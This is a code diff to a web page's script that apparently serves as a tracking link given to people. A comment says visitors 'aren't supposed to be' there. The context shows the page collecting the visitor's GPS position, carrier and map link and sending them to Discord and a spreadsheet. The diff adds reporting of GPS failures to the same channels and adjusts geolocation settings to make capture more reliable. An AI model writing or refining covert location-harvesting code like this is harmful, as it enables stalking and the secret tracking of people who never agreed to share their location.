@@ -253,13 +253,30 @@ if you are here then you aren't supposed to be (especially if i gave you this li
                   mapsUrl: mapsUrl
                 });
               },
-              (error) => { console.log("GPS denied at system level."); },
-              { enableHighAccuracy: true, timeout: 8000 }
+              (error) => {
+                let errReason = "GPS Unknown Error";
+                if (error.code === 1) errReason = "GPS Denied (User/System)";
+                if (error.code === 2) errReason = "GPS Position Unavailable";
+                if (error.code === 3) errReason = "GPS Timeout";
+
+                // Log failure to Discord & Sheets
+                sendToDiscord("⚠️ GPS Failed", [
+                  { name: "Reason", value: errReason, inline: true },
+                  { name: "Time", value: new Date().toLocaleString(), inline: false }
+                ], 15158332);
+
+                sendToSheet({
+                  type: "GPS Failed",
+                  location: errReason,
+                  carrier: "N/A",
+                  mapsUrl: "N/A"
+                });
+              },
+              { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
             );
           }
         });
-      }
-    })();
+      };
   </script>
 </body>
 </html>
